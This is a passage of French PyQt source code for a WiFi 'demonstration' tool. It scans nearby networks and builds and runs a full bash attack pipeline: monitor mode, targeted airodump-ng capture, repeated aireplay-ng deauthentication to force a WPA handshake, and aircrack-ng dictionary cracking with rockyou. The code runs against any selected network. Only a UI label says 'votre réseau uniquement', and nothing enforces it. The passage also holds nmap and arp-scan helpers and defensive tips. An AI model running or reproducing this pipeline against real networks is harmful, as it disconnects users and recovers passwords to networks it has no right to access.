                          f"--enable_status=1 2>&1"),
        "social":dict(tip_k="warn",
            tip="<b>Tromper l'humain :</b> Evil Twin AP, faux portail captif, "
                "usurpation de technicien.",
            tip2_k="danger",
            tip2="<b>85% des incidents</b> impliquent l'humain. "
                 "Aucun MDP fort ne protège contre quelqu'un qui le donne.",
            tip3_k="success",
            tip3="<b>Défense :</b> Formation, sensibilisation, "
                 "ne jamais donner le MDP à un inconnu.",
            opts=[],cmd=None),
    }

    def __init__(self,term:Terminal):
        super().__init__(); self._t=term; self._opts={}
        self._nets=[]
        self._cap_thread = None          # ← thread capture préparatoire
        self._current_cap = ""           # ← chemin du .cap actif
        # ← rafraîchir le champ cap automatiquement après chaque capture
        self._t.cap_ready.connect(self._on_cap_ready)
        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
        lay.addWidget(Lbl("Méthodes d'Attaque WiFi",WHITE,19,True))
        lay.addWidget(Lbl("Comprendre pour mieux défendre — sur votre réseau uniquement",DIM,10))
        lay.addWidget(HRule())

        # ── Sélecteur de réseau cible ───────────────────────────────
        tg=QFrame()
        tg.setStyleSheet(
            f"QFrame{{background:{BG2};border:1px solid {ORANGE}44;"
            f"border-radius:4px;}}")
        tgl=QVBoxLayout(tg); tgl.setContentsMargins(12,10,12,10); tgl.setSpacing(6)
        tgl.addWidget(Lbl("🎯  RÉSEAU CIBLE",ORANGE,10))
        tgl.addWidget(HRule())

        row_sel=QHBoxLayout(); row_sel.setSpacing(8)
        self._net_combo=QComboBox()
        self._net_combo.setMinimumWidth(420)
        self._net_combo.setStyleSheet(f"""
            QComboBox{{background:{BG};border:1px solid {ORANGE}66;color:{WHITE};
              padding:7px 10px;border-radius:3px;font-size:11px;
              font-family:"JetBrains Mono",monospace;}}
            QComboBox:focus{{border-color:{ORANGE};}}
            QComboBox::drop-down{{border:none;width:22px;}}
            QComboBox QAbstractItemView{{background:{PANEL};border:1px solid {B2};
              color:{TEXT};selection-background-color:{B1};font-size:11px;
              font-family:"JetBrains Mono",monospace;}}""")
        self._net_combo.addItem("— Aucun réseau  (lancez d'abord un scan WiFi) —")
        self._net_combo.currentIndexChanged.connect(self._on_net_selected)

        btn_scan=Btn("🔍 Scanner",CYAN,sm=True)
        btn_scan.clicked.connect(lambda: self._t.run(nm_fix_wrap(
            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1")))
        row_sel.addWidget(self._net_combo,1)
        row_sel.addWidget(btn_scan)
        tgl.addLayout(row_sel)

        # Infos du réseau sélectionné
        row_info=QHBoxLayout(); row_info.setSpacing(16)
        self._lbl_ssid  =Lbl("SSID: —",DIM,10)
        self._lbl_bssid =Lbl("BSSID: —",DIM,10)
        self._lbl_sec   =Lbl("Sécu: —",DIM,10)
        self._lbl_chan   =Lbl("Canal: —",DIM,10)
        self._lbl_cap   =Lbl("Cap: —",DIM,10)
        for lb in [self._lbl_ssid,self._lbl_bssid,self._lbl_sec,
                   self._lbl_chan,self._lbl_cap]:
            row_info.addWidget(lb)
        row_info.addStretch()
        tgl.addLayout(row_info)

        # ── Barre statut capture préparatoire ──────────────────────
        self._cap_status = Lbl(
            "⏳ Sélectionnez un réseau → capture.cap sera créé automatiquement",
            DIM, 10)
        self._cap_status.setStyleSheet(
            f"color:{DIM};font-size:10px;background:rgba(0,0,0,0);"
            f"border:1px solid {B1};border-radius:3px;padding:4px 8px;")
        tgl.addWidget(self._cap_status)
        lay.addWidget(tg)

        # ── Grille méthodes ────────────────────────────────────────
        grid=QGridLayout(); grid.setSpacing(8)
        for i,(key,name,col,speed) in enumerate(self._M):
            b=QPushButton(f"{name}\n{speed}")
            b.setStyleSheet(f"""
                QPushButton{{background:{BG2};border:1px solid {B2};color:{TEXT};
                  padding:12px;border-radius:3px;text-align:left;font-size:11px;}}
                QPushButton:hover{{border-color:{col};background:{PANEL};}}""")
            b.clicked.connect(lambda _,k=key: self._show(k))
            grid.addWidget(b,i//2,i%2)
        lay.addLayout(grid)

        self._df=CardF(); self._dl=QVBoxLayout(self._df)
        self._dl.setContentsMargins(14,12,14,14); self._dl.setSpacing(8)
        self._dl.addWidget(Lbl("← Cliquez sur une méthode",DIM,10))
        lay.addWidget(self._df)

        # Message clé
        km=QFrame(); km.setStyleSheet(
            f"QFrame{{background:rgba(0,212,255,.06);"
            f"border:1px solid rgba(0,212,255,.22);border-radius:4px;}}")
        kl=QVBoxLayout(km); kl.setContentsMargins(14,12,14,12); kl.setSpacing(5)
        kl.addWidget(Lbl("👉 Message Clé",WHITE,13,True))
        for txt in [
            "WPA2/WPA3 + MDP 16+ chars = base minimum obligatoire",
            "Désactiver WPS dans le routeur — faille critique incontournable",
            "MDP faible: cracké en secondes  |  MDP fort: milliards d'années",
            "Social engineering contourne toute la sécurité technique"]:
            r=QHBoxLayout(); r.setSpacing(8)
            r.addWidget(Lbl("▶",CYAN,10)); r.addWidget(Lbl(txt,TEXT,11),1)
            kl.addLayout(r)
        lay.addWidget(km)

    def set_nets(self,nets):
        """Appelé par MainWin quand un scan retourne des réseaux."""
        self._nets=nets
        prev=self._net_combo.currentIndex()
        self._net_combo.blockSignals(True)
        self._net_combo.clear()
        self._net_combo.addItem("— Sélectionner le réseau cible —")
        for n in nets:
            ssid  =n.get("ssid","<hidden>")
            bssid =n.get("bssid","?")
            sig   =n.get("signal","?")
            sec   =n.get("security","?")
            chan  =n.get("channel","?")
            rate  =n.get("rate","?")
            label=f"{ssid:<18}  {bssid}   sig:{sig}%  ch:{chan}  {rate}  {sec}"
            self._net_combo.addItem(label)
        self._net_combo.blockSignals(False)
        # Restaurer sélection si possible
        if prev>0 and prev<self._net_combo.count():
            self._net_combo.setCurrentIndex(prev)
        else:
            self._net_combo.setCurrentIndex(0)

    def _on_net_selected(self,idx):
        """Dès la sélection d'un réseau : lance la capture préparatoire
        et met à jour les 2 champs Cap / Fichier .cap en temps réel."""
        # ── Annuler toute capture précédente ───────────────────────
        if self._cap_thread and self._cap_thread.isRunning():
            self._cap_thread.abort()
            self._cap_thread.wait(800)

        if idx<=0 or idx-1>=len(self._nets):
            for lb in [self._lbl_ssid,self._lbl_bssid,self._lbl_sec,
                       self._lbl_chan,self._lbl_cap]:
                lb.setText(lb.text().split(":")[0]+": —")
                lb.setStyleSheet(f"color:{DIM};font-size:10px;background:transparent;")
            self._cap_status.setText(
                "⏳ Sélectionnez un réseau → capture.cap sera créé automatiquement")
            self._cap_status.setStyleSheet(
                f"color:{DIM};font-size:10px;background:rgba(0,0,0,0);"
                f"border:1px solid {B1};border-radius:3px;padding:4px 8px;")
            return

        n    = self._nets[idx-1]
        ssid = n.get("ssid","<hidden>")
        bssid= n.get("bssid","?")
        sec  = n.get("security","?")
        chan  = str(n.get("channel","6"))
        s    = sec.lower()
        sc   = CYAN if "wpa3" in s else GREEN if "wpa2" in s else ORANGE if "wpa" in s else RED

        # ── Nom du futur fichier (avant création) ──────────────────
        home     = os.path.expanduser("~")
        safe     = bssid.replace(":","")
        cap_future = os.path.join(home, f"capture-{safe}-01.cap")

        # ── Mise à jour labels info réseau ─────────────────────────
        self._lbl_ssid .setText(f"SSID: {ssid}")
        self._lbl_bssid.setText(f"BSSID: {bssid}")
        self._lbl_sec  .setText(f"Sécu: {sec}")
        self._lbl_chan  .setText(f"Canal: {chan}")
        self._lbl_cap  .setText(f"Cap: capture-{safe}-01.cap ⚡")
        for lb,col in [(self._lbl_ssid,WHITE),(self._lbl_bssid,CYAN),
                       (self._lbl_sec,sc),(self._lbl_chan,ORANGE),
                       (self._lbl_cap,ORANGE)]:
            lb.setStyleSheet(
                f"color:{col};font-size:10px;font-weight:bold;background:transparent;")

        # ── Pré-remplir les 2 champs BSSID + cap immédiatement ────
        if "bssid" in self._opts:
            self._opts["bssid"].setText(bssid)
        self._set_cap_fields(cap_future)   # chemin futur (pas encore créé)

        # ── Barre statut : en cours ────────────────────────────────
        self._cap_status.setText(
            f"⚡ Création automatique capture-{safe}-01.cap en cours…  "
            f"BSSID={bssid}  CH={chan}")
        self._cap_status.setStyleSheet(
            f"color:{ORANGE};font-size:10px;font-weight:bold;"
            f"background:rgba(255,140,0,.07);"
            f"border:1px solid {ORANGE}55;border-radius:3px;padding:4px 8px;")

        # ── Lancer le thread de capture préparatoire ───────────────
        self._cap_thread = CapturePrepThread(bssid, chan)
        self._cap_thread.cap_path .connect(self._on_cap_created)
        self._cap_thread.log_line .connect(lambda m: self._t.note(m, CYAN))
        self._cap_thread.finished .connect(self._on_cap_thread_done)
        self._cap_thread.start()

    def _set_cap_fields(self, path):
        """Met à jour le champ 'Fichier .cap:' ET le label 'Cap:' en même temps."""
        self._current_cap = path
        if "cap" in self._opts:
            self._opts["cap"].setText(path)
        name   = os.path.basename(path)
        exists = os.path.exists(path)
        col    = GREEN if exists else ORANGE
        tag    = "✅" if exists else "⚡ AUTO"
        self._lbl_cap.setText(f"Cap: {name} {tag}")
        self._lbl_cap.setStyleSheet(
            f"color:{col};font-size:10px;font-weight:bold;background:transparent;")

    def _on_cap_created(self, path):
        """Appelé par CapturePrepThread dès que le fichier .cap est créé sur disque."""
        self._set_cap_fields(path)
        name = os.path.basename(path)
        self._cap_status.setText(f"✅ {name} prêt — cliquez ▶ LANCER DÉMONSTRATION")
        self._cap_status.setStyleSheet(
            f"color:{GREEN};font-size:10px;font-weight:bold;"
            f"background:rgba(0,255,136,.07);"
            f"border:1px solid {GREEN}55;border-radius:3px;padding:4px 8px;")
        self._t.note(f"✅ capture prêt → {name}", GREEN)

    def _on_cap_thread_done(self):
        """Appelé quand le thread termine (timeout ou abort)."""
        if not self._current_cap or not os.path.exists(self._current_cap):
            self._cap_status.setText(
                "⚠ Capture terminée sans fichier — vérifiez wlan0mon (Phase1 → Étape 1)")
            self._cap_status.setStyleSheet(
                f"color:{RED};font-size:10px;font-weight:bold;"
                f"background:rgba(255,32,80,.07);"
                f"border:1px solid {RED}55;border-radius:3px;padding:4px 8px;")

    def _current_net(self):
        """Retourne le réseau sélectionné ou None."""
        idx=self._net_combo.currentIndex()
        if idx<=0 or idx-1>=len(self._nets): return None
        return self._nets[idx-1]

    def _best_cap(self):
        """
        Retourne le meilleur fichier .cap à utiliser :
        - Priorité 1 : fichier avec handshake WPA (le plus récent)
        - Priorité 2 : n'importe quel .cap récent
        - Priorité 3 : chemin du futur fichier auto (pas encore créé)
        Met aussi à jour le label _lbl_cap dans la barre infos.
        """
        home = os.path.expanduser("~")
        cap_prefix = os.path.join(home, "capture")
        candidates = sorted(
            glob.glob(f"{home}/capture-*.cap") +
            glob.glob(f"{home}/capture-*.pcap") +
            glob.glob("/tmp/*.cap"),
            key=os.path.getmtime, reverse=True)
        # Chercher un fichier avec handshake
        for c in candidates:
            try:
                r = subprocess.run(
                    f"aircrack-ng '{c}' 2>&1 | grep -i 'WPA handshake'",
                    shell=True, capture_output=True, text=True, timeout=6)
                if r.stdout.strip():
                    return c  # ✅ handshake confirmé
            except Exception:
                pass
        # Sinon premier .cap existant
        if candidates:
            return candidates[0]
        # Sinon chemin futur du pipeline auto
        return f"{cap_prefix}-auto-01.cap"

    def _refresh_cap_field(self):
        """Rafraîchit le champ cap avec le meilleur fichier disponible (bouton 🔄)."""
        best = self._current_cap if (self._current_cap and os.path.exists(self._current_cap)) \
               else self._best_cap()
        self._set_cap_fields(best)

    def _show(self,key):
        d=self._D.get(key,{}); self._opts={}
        while self._dl.count():
            it=self._dl.takeAt(0)
            if it.widget(): it.widget().deleteLater()
        names={m[0]:m[1] for m in self._M}
        self._dl.addWidget(Lbl(names.get(key,""),WHITE,13,True))
        self._dl.addWidget(HRule())
        self._dl.addWidget(TipW(d.get("tip",""),d.get("tip_k","info")))
        if "tip2" in d: self._dl.addWidget(TipW(d["tip2"],d.get("tip2_k","warn")))
        if "tip3" in d: self._dl.addWidget(TipW(d["tip3"],d.get("tip3_k","success")))

        # ── Valeurs auto depuis réseau sélectionné ─────────────────
        net        = self._current_net()
        bssid_auto = net.get("bssid","") if net else ""
        # Priorité : fichier du thread préparatoire > meilleur existant
        cap_auto   = self._current_cap if self._current_cap else self._best_cap()

        for (lbl_txt,var,default) in d.get("opts",[]):
            r=QHBoxLayout(); r.setSpacing(6)
            r.addWidget(Lbl(lbl_txt,DIM,10))
            if var=="bssid" and bssid_auto:
                val=bssid_auto
            elif var=="cap":
                val=cap_auto
            else:
                val=default
            f=Inp(lbl_txt,val); self._opts[var]=f
            # Bouton 🔄 à côté du champ cap pour rafraîchir
            if var=="cap":
                br2=QPushButton("🔄"); br2.setFixedSize(26,26)
                br2.setToolTip("Rafraîchir — cherche le fichier .cap le plus récent")
                br2.setStyleSheet(
                    f"QPushButton{{background:{B1};border:1px solid {B2};"
                    f"color:{CYAN};border-radius:3px;font-size:11px;padding:0;}}"
                    f"QPushButton:hover{{border-color:{CYAN};background:{B2};}}")
                br2.clicked.connect(self._refresh_cap_field)
                r.addWidget(f,1); r.addWidget(br2)
            else:
                r.addWidget(f,1)
            self._dl.addLayout(r)

        # ── Indicateur statut du fichier cap ──────────────────────
        if "cap" in self._opts:
            exists = os.path.exists(cap_auto)
            col    = GREEN if exists else ORANGE
            tag    = "✅ Handshake prêt" if exists else "⚡ Sera créé automatiquement au lancement"
            tip_cap= TipW(
                f"<b>Fichier capture :</b> <code>{os.path.basename(cap_auto)}</code><br>"
                f"{tag}",
                "success" if exists else "warn")
            self._dl.addWidget(tip_cap)

        if d.get("cmd") is not None or d.get("run_fn"):
            r=QHBoxLayout(); r.setSpacing(6)
            br=Btn("▶  LANCER DÉMONSTRATION",CYAN)
            bx=Btn("■ Stop",RED,sm=True)
            br.clicked.connect(lambda _,k=key: self._run(k))
            bx.clicked.connect(self._t.stop)
            r.addWidget(br); r.addWidget(bx); r.addStretch()
            self._dl.addLayout(r)

    def _run_dict(self, opts):
        """Pipeline complet 5 etapes : moniteur -> scan -> capture -> deauth -> aircrack."""
        import tempfile, stat

        wl    = opts.get("wl", "/usr/share/wordlists/rockyou.txt").strip()
        bssid = opts.get("bssid", "").strip()
        home  = os.path.expanduser("~")

        # Recuperer infos reseau selectionne
        net   = self._current_net()
        if not bssid and net:
            bssid = net.get("bssid", "").strip()
        chan  = str(net.get("channel", "6")).strip() if net else "6"

        if not bssid:
            self._t.note("BSSID manquant -- selectionnez un reseau cible", RED)
            self._t.note("Cliquez Scanner puis choisissez votre reseau", ORANGE)
            return

        safe     = bssid.replace(":", "")
        cap_out  = os.path.join(home, f"capture-{safe}")
        cap_final = f"{cap_out}-01.cap"

        # Chercher handshake existant
        existing_cap = ""
        candidates = sorted(
            glob.glob(f"{home}/capture-*.cap") +
            glob.glob(f"{home}/capture-*.pcap") +
            glob.glob("/tmp/*.cap"),
            key=os.path.getmtime, reverse=True)
        for c in candidates:
            try:
                r = subprocess.run(
                    ["aircrack-ng", c],
                    capture_output=True, text=True, timeout=8)
                if "WPA handshake" in r.stdout or "WPA handshake" in r.stderr:
                    existing_cap = c
                    break
            except Exception:
                pass

        self._t.note("== DEMONSTRATION ATTAQUE WPA2 - PIPELINE COMPLET ==", CYAN)

        if existing_cap:
            self._set_cap_fields(existing_cap)
            self._t.note(f"Handshake existant : {os.path.basename(existing_cap)}", GREEN)
            self._t.note("Etapes 1-4 ignorees -- lancement crack direct", GREEN)
            # Script minimal pour le cas handshake existant
            script = (
                "#!/bin/bash\n"
                "set -e\n"
                f'CAP="{existing_cap}"\n'
                f'WL="{wl}"\n'
                f'BSSID="{bssid}"\n'
                'echo ""\n'
                'echo "--- ETAPE 5/5 : Crack dictionnaire ---"\n'
                f'echo "  Fichier  : $CAP"\n'
                f'echo "  Wordlist : $WL"\n'
                f'echo "  BSSID    : $BSSID"\n'
                f'echo "  Commande : aircrack-ng -w $WL -b $BSSID $CAP"\n'
                'echo ""\n'
                f'aircrack-ng -w "$WL" -b "$BSSID" "$CAP" 2>&1\n'
                'echo ""\n'
                'echo "--- FIN ---"\n'
                'echo "KEY FOUND    -> MDP faible, changez-le !"\n'
                'echo "KEY NOT FOUND -> MDP robuste ou WPA3."\n'
            )
        else:
            self._set_cap_fields(cap_final)
            self._t.note(f"Fichier cible : {cap_final}", CYAN)
            # Script complet 5 etapes
            script = (
                "#!/bin/bash\n"
                "\n"
                f'BSSID="{bssid}"\n'
                f'CHAN="{chan}"\n'
                f'WL="{wl}"\n'
                f'CAP_OUT="{cap_out}"\n'
                f'CAP_FINAL="{cap_final}"\n'
                'IFACE="wlan0mon"\n'
                "\n"

                # ETAPE 1
                'echo ""\n'
                'echo "=== ETAPE 1/5 : Mode moniteur ==="\n'
                'echo "  sudo airmon-ng start wlan0"\n'
                'echo ""\n'
                'if iw dev wlan0mon info >/dev/null 2>&1; then\n'
                '  echo "OK wlan0mon deja actif"\n'
                'else\n'
                '  sudo airmon-ng check kill 2>&1 | grep -v "^$" || true\n'
                '  sudo airmon-ng start wlan0 2>&1\n'
                '  sleep 2\n'
                '  if iw dev wlan0mon info >/dev/null 2>&1; then\n'
                '    echo "OK wlan0mon actif"\n'
                '  else\n'
                '    echo "ERREUR : impossible activer wlan0mon"\n'
                '    echo "  -> Verifiez que la carte supporte le mode moniteur"\n'
                '    exit 1\n'
                '  fi\n'
                'fi\n'
                "\n"

                # ETAPE 2
                'echo ""\n'
                'echo "=== ETAPE 2/5 : Scan de confirmation (5s) ==="\n'
                'echo "  sudo airodump-ng wlan0mon"\n'
                'echo ""\n'
                f'sudo timeout 5 airodump-ng wlan0mon 2>&1 | grep -E "BSSID|{bssid}" | head -5 || true\n'
                f'echo "  Reseau cible : BSSID={bssid}  Canal={chan}"\n'
                "\n"

                # ETAPE 3
                'echo ""\n'
                'echo "=== ETAPE 3/5 : Capture ciblee (creation fichier .cap) ==="\n'
                f'echo "  sudo airodump-ng -c {chan} --bssid {bssid} -w capture-{safe} wlan0mon"\n'
                'echo ""\n'
                # Nettoyage
                'rm -f "${CAP_OUT}"-*.cap "${CAP_OUT}"-*.csv "${CAP_OUT}"-*.kismet.* "${CAP_OUT}"-*.log.csv 2>/dev/null || true\n'
                # Lancement airodump en BG
                'sudo timeout 90 airodump-ng \\\n'
                '  -c "$CHAN" --bssid "$BSSID" \\\n'
                '  -w "$CAP_OUT" --output-format pcap \\\n'
                '  "$IFACE" >/tmp/_airodump_demo.log 2>&1 &\n'
                'DUMP_PID=$!\n'
                'echo "  airodump-ng lance (PID=$DUMP_PID)"\n'
                f'echo "  Fichier cible : {cap_final}"\n'
                'sleep 4\n'
                "\n"

                # ETAPE 4
                'echo ""\n'
                'echo "=== ETAPE 4/5 : Deauthentification (force handshake) ==="\n'
                f'echo "  sudo aireplay-ng -0 5 -a {bssid} wlan0mon"\n'
                'echo ""\n'
                'sudo aireplay-ng -0 5 -a "$BSSID" "$IFACE" 2>&1 || echo "aireplay-ng indisponible -- attente passive"\n'
                'WAITED=0\n'
                'HS_FOUND=0\n'
                'echo ""\n'
                'echo "  En attente du handshake [WPA handshake: ...]..."\n'
                'while kill -0 $DUMP_PID 2>/dev/null && [ $WAITED -lt 80 ]; do\n'
                '  CAP_TMP=$(ls -t "${CAP_OUT}"-*.cap 2>/dev/null | head -1)\n'
                '  if [ -n "$CAP_TMP" ]; then\n'
                '    HS=$(aircrack-ng "$CAP_TMP" 2>&1 | grep -i "WPA handshake")\n'
                '    if [ -n "$HS" ]; then\n'
                '      echo ""\n'
                '      echo "OK [WPA handshake capture] apres ${WAITED}s !"\n'
                '      echo "  $HS"\n'
                '      HS_FOUND=1\n'
                '      sudo kill $DUMP_PID 2>/dev/null || true\n'
                '      break\n'
                '    fi\n'
                '  fi\n'
                '  sleep 3\n'
                '  WAITED=$((WAITED+3))\n'
                '  echo "  attente ${WAITED}s..."\n'
                '  if [ $((WAITED % 15)) -eq 0 ]; then\n'
                '    sudo aireplay-ng -0 5 -a "$BSSID" "$IFACE" 2>&1 | grep -v "^$" || true\n'
                '  fi\n'
                'done\n'
                'wait $DUMP_PID 2>/dev/null || true\n'
                "\n"

                # ETAPE 5
                'echo ""\n'
                'echo "=== ETAPE 5/5 : Crack dictionnaire (aircrack-ng) ==="\n'
                'CAP=$(ls -t "${CAP_OUT}"-*.cap 2>/dev/null | head -1)\n'
                'if [ -z "$CAP" ]; then\n'
                '  echo "ERREUR : aucun fichier .cap cree"\n'
                '  echo "  -> Verifiez wlan0mon actif et un client connecte au reseau"\n'
                '  exit 1\n'
                'fi\n'
                'echo "  Fichier    : $CAP"\n'
                f'echo "  Commande   : aircrack-ng -w {wl} -b {bssid} $CAP"\n'
                'echo ""\n'
                'if [ "$HS_FOUND" = "0" ]; then\n'
                '  echo "Aucun handshake confirme -- tentative quand meme..."\n'
                '  echo ""\n'
                'fi\n'
                f'aircrack-ng -w "{wl}" -b "$BSSID" "$CAP" 2>&1\n'
                'echo ""\n'
                'echo "-----------------------------------"\n'
                'echo "FIN DEMONSTRATION"\n'
                'echo "KEY FOUND    -> MDP faible, changez-le !"\n'
                'echo "KEY NOT FOUND -> MDP robuste ou WPA3."\n'
                'echo "-----------------------------------"\n'
                'echo ""\n'

                # Restauration NM
                'echo "Restauration NetworkManager..."\n'
                'sudo airmon-ng stop wlan0mon 2>&1 | grep -v "^$" || true\n'
                'sudo systemctl restart NetworkManager 2>&1\n'
                'sleep 2\n'
                'echo "OK NetworkManager restaure"\n'
            )

        # Ecrire le script dans un fichier temporaire et l'executer
        tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix=".sh", delete=False,
            dir="/tmp", prefix="wifi_demo_")
        tmp.write(script)
        tmp.flush(); tmp.close()
        os.chmod(tmp.name, 0o755)
        self._t.run(f"bash {tmp.name} ; rm -f {tmp.name}")

    def _run(self,key):
        d=self._D.get(key,{})
        opts={var:(self._opts[var].text().strip() or default)
              for (lbl,var,default) in d.get("opts",[]) if var in self._opts}
        if d.get("run_fn")=="dict":
            self._run_dict(opts); return
        fn=d.get("cmd")
        if fn:
            self._t.run(fn(opts))

    def _on_cap_ready(self, cap_path):
        """Signal du Terminal — un .cap a été détecté après une commande."""
        self._set_cap_fields(cap_path)

    def set_nets(self,nets):
        """Appelé par MainWin quand un scan retourne des réseaux."""
        self._nets=nets
        prev=self._net_combo.currentIndex()
        self._net_combo.blockSignals(True)
        self._net_combo.clear()
        self._net_combo.addItem("— Sélectionner le réseau cible —")
        for n in nets:
            ssid  =n.get("ssid","<hidden>")
            bssid =n.get("bssid","?")
            sig   =n.get("signal","?")
            sec   =n.get("security","?")
            chan  =n.get("channel","?")
            rate  =n.get("rate","?")
            label=f"{ssid:<18}  {bssid}   sig:{sig}%  ch:{chan}  {rate}  {sec}"
            self._net_combo.addItem(label)
        self._net_combo.blockSignals(False)
        # Restaurer sélection si possible
        if prev>0 and prev<self._net_combo.count():
            self._net_combo.setCurrentIndex(prev)
        else:
            self._net_combo.setCurrentIndex(0)
        # Rafraîchir le champ cap après tout nouveau scan
        self._refresh_cap_field()

# ══════════════════════════════════════════════════════════════════
#  ONGLET APPAREILS
# ══════════════════════════════════════════════════════════════════
class TabDevices(QWidget):
    def __init__(self,term:Terminal):
        super().__init__(); self._t=term; self._macs=[]
        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
        lay.addWidget(Lbl("Appareils sur le Réseau",WHITE,19,True))
        lay.addWidget(Lbl("Détection ARP · Nmap · Filtre MAC",DIM,10))
        lay.addWidget(HRule())
        sg=QGroupBox("// SCAN RÉSEAU"); sl=QVBoxLayout(sg)
        sr=QHBoxLayout(); sr.setSpacing(6)
        self._sub=Inp("Sous-réseau","192.168.1.0/24")
        ba=Btn("ARP Scan",CYAN,sm=True); bn=Btn("Nmap -sn",ORANGE,sm=True)
        bv=Btn("Nmap -sV",PURPLE,sm=True); bh=Btn("Hosts actifs",DIM,sm=True)
        ba.clicked.connect(lambda: self._t.run(
            f"sudo arp-scan {self._sub.text()} 2>&1"))
        bn.clicked.connect(lambda: self._t.run(
            f"nmap -sn {self._sub.text()} 2>&1"))
        bv.clicked.connect(lambda: self._t.run(
            f"nmap -sV --open {self._sub.text()} 2>&1"))
        bh.clicked.connect(lambda: self._t.run(
            f"nmap -T4 -F {self._sub.text()} 2>&1"))
        sr.addWidget(self._sub,1); sr.addWidget(ba); sr.addWidget(bn)
        sr.addWidget(bv); sr.addWidget(bh); sl.addLayout(sr)
        self._tbl=QTableWidget(0,4)
        self._tbl.setHorizontalHeaderLabels(["IP","MAC","HOSTNAME","STATUT"])
        h=self._tbl.horizontalHeader()
        h.setSectionResizeMode(0,QHeaderView.ResizeToContents)
        h.setSectionResizeMode(1,QHeaderView.ResizeToContents)
        h.setSectionResizeMode(2,QHeaderView.Stretch)
        h.setSectionResizeMode(3,QHeaderView.Fixed); self._tbl.setColumnWidth(3,90)
        self._tbl.verticalHeader().setVisible(False)
        self._tbl.setAlternatingRowColors(True); self._tbl.setFixedHeight(175)
        sl.addWidget(self._tbl); lay.addWidget(sg)
        # Filtre MAC
        mg=QGroupBox("// FILTRE MAC"); ml=QVBoxLayout(mg)
        mr=QHBoxLayout(); mr.setSpacing(6)
        self._mac_in=Inp("AA:BB:CC:DD:EE:FF"); self._mac_dc=Inp("Description")
        ba2=Btn("+ Ajouter",GREEN,sm=True); ba2.clicked.connect(self._add_mac)
        mr.addWidget(self._mac_in); mr.addWidget(self._mac_dc,1); mr.addWidget(ba2)
        ml.addLayout(mr)
        self._mac_tbl=QTableWidget(0,3)
        self._mac_tbl.setHorizontalHeaderLabels(["MAC","DESCRIPTION","ACTION"])
        h2=self._mac_tbl.horizontalHeader()
        h2.setSectionResizeMode(0,QHeaderView.ResizeToContents)
        h2.setSectionResizeMode(1,QHeaderView.Stretch)
        h2.setSectionResizeMode(2,QHeaderView.Fixed); self._mac_tbl.setColumnWidth(2,75)
        self._mac_tbl.verticalHeader().setVisible(False); self._mac_tbl.setFixedHeight(110)
        ml.addWidget(self._mac_tbl); lay.addWidget(mg); lay.addStretch()

    def _add_mac(self):
        mac=self._mac_in.text().strip(); dc=self._mac_dc.text().strip()
        if not mac: return
        self._macs.append({"mac":mac,"dc":dc})
        row=self._mac_tbl.rowCount(); self._mac_tbl.insertRow(row)
        self._mac_tbl.setItem(row,0,QTableWidgetItem(mac))
        self._mac_tbl.setItem(row,1,QTableWidgetItem(dc))
        db=QPushButton("✕ Retirer")
        db.setStyleSheet(
            f"QPushButton{{background:transparent;border:1px solid {RED};color:{RED};"
            f"padding:2px 6px;font-size:9px;border-radius:2px;}}"
            f"QPushButton:hover{{background:{RED};color:#fff;}}")
        db.clicked.connect(lambda _,r=row: self._mac_tbl.removeRow(r))
        self._mac_tbl.setCellWidget(row,2,db)
        self._mac_in.clear(); self._mac_dc.clear()

# ══════════════════════════════════════════════════════════════════
#  ONGLET VULNÉRABILITÉS
# ══════════════════════════════════════════════════════════════════
class TabVulns(QScrollArea):
    def __init__(self,term:Terminal):
        super().__init__(); self._t=term
        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
        self._w=QWidget(); self._lay=QVBoxLayout(self._w)
        self._lay.setContentsMargins(14,14,14,14); self._lay.setSpacing(8)
        self._lay.addWidget(Lbl("Vulnérabilités Détectées",WHITE,19,True))
        self._lay.addWidget(Lbl("Analyse automatique des failles WiFi",DIM,10))
        self._lay.addWidget(HRule())
        # Bouton analyser
        row=QHBoxLayout()
        ba=Btn("🔍 Analyser les réseaux scannés",CYAN)
        bwps=Btn("📶 Scanner WPS",ORANGE,sm=True)
        ba.clicked.connect(self._analyze)
        bwps.clicked.connect(lambda: self._t.run(
            "sudo wash -i wlan0mon --ignore-fcs 2>&1"))
        row.addWidget(ba); row.addWidget(bwps); row.addStretch()
        self._lay.addLayout(row)
        self._lay.addWidget(TipW(
            "Scannez d'abord les réseaux (Vue d'ensemble → ▶ Scanner WiFi) "
            "puis cliquez Analyser.","info"))
        self._start=self._lay.count(); self._nets=[]
        self._lay.addStretch(); self.setWidget(self._w)

    def set_nets(self,nets): self._nets=nets

    def _analyze(self):
        while self._lay.count()>self._start:
            it=self._lay.takeAt(self._start)
            if it.widget(): it.widget().deleteLater()
        vulns=[]
        for n in self._nets:
            s=(n.get("security","") or "").lower()
            if not s or "open" in s:
                vulns.append(("CRITICAL",f"Réseau ouvert: {n.get('ssid','?')}",
                    "Aucune auth. Tout le monde peut connecter et intercepter."))
            if "wep" in s:
                vulns.append(("CRITICAL",f"WEP: {n.get('ssid','?')}",
                    "WEP cassé depuis 2001. Cracké en moins de 5 minutes."))
            if "wpa" in s and "wpa2" not in s and "wpa3" not in s:
                vulns.append(("HIGH",f"WPA1: {n.get('ssid','?')}",
                    "WPA1/TKIP vulnérable. Migrer vers WPA2-AES ou WPA3."))
        vulns+=[
            ("HIGH","WPS potentiellement actif",
             "Activé par défaut. Cracké en quelques heures max."),
            ("MEDIUM","SSID broadcast actif",
             "Masquer le SSID réduit la visibilité."),
            ("LOW","Réseau invité absent",
             "IoT et visiteurs devraient être sur un réseau séparé."),
        ]
        SEV={"CRITICAL":(RED,"#fff"),"HIGH":(ORANGE,"#000"),
             "MEDIUM":(YELLOW,"#000"),"LOW":(GREEN,"#000")}
        for sev,title,desc in vulns:
            fg,bfg=SEV.get(sev,(TEXT,BG))
            f=QFrame()
            f.setStyleSheet(
                f"QFrame{{background:{fg}0a;border:1px solid {fg}44;border-radius:3px;}}")
            fl=QHBoxLayout(f); fl.setContentsMargins(10,10,10,10); fl.setSpacing(10)
            badge=QLabel(sev); badge.setFixedWidth(68); badge.setAlignment(Qt.AlignCenter)
            badge.setStyleSheet(
                f"background:{fg};color:{bfg};padding:3px 5px;border-radius:2px;"
                f"font-size:9px;font-weight:bold;border:none;")
            inf=QVBoxLayout()
